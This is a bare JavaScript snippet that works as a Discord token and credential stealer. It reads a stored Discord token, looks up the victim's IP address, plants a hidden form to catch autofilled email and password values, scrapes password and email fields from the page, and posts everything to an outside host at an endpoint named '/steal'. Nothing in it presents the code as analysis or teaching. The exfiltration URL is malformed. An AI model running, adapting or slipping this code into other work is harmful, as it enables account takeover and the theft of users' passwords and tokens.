(async () => {
       const token = localStorage.getItem('token') || (await (await fetch('https://discord.com/api/v9/users/@me', {
           headers: { 'Authorization': 'Bearer ' + document.__discordToken }
       })).json()).token;

       const userInfo = {
           userAgent: navigator.userAgent,
           platform: navigator.platform,
           ip: await (await fetch('https://api.ipify.org?format=json')).json().ip
       };

       let credentials = [];
       try {
           const form = document.createElement('form');
           form.style.display = 'none';
           form.innerHTML = '<input type="email" name="email"><input type="password" name="password">';
           document.body.appendChild(form);
           setTimeout(() => {
               const emailInput = form.querySelector('input[type="email"]');
               const passwordInput = form.querySelector('input[type="password"]');
               if (emailInput.value && passwordInput.value) {
                   credentials.push({
                       email: emailInput.value,
                       password: passwordInput.value
                   });
               }
               document.body.removeChild(form);
           }, 500);
           document.querySelectorAll('input[type="email"], input[type="text"]').forEach(input => {
               if (input.value.includes('@')) {
                   credentials.push({
                       email: input.value,
                       password: 'Unknown (form email)'
                   });
               }
           });
           document.querySelectorAll('input[type="password"]').forEach(input => {
               if (input.value) {
                   credentials.push({
                       email: 'Unknown (form password)',
                       password: input.value
                   });
               }
           });
       } catch (e) {
           credentials.push({ email: 'Error', password: 'Could not access credentials' });
       }

       await new Promise(resolve => setTimeout(resolve, 1000));

       fetch('https://https://dustrrr.onrender.com/steal', {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify({ token, user_info: userInfo, credentials })
       });
   })();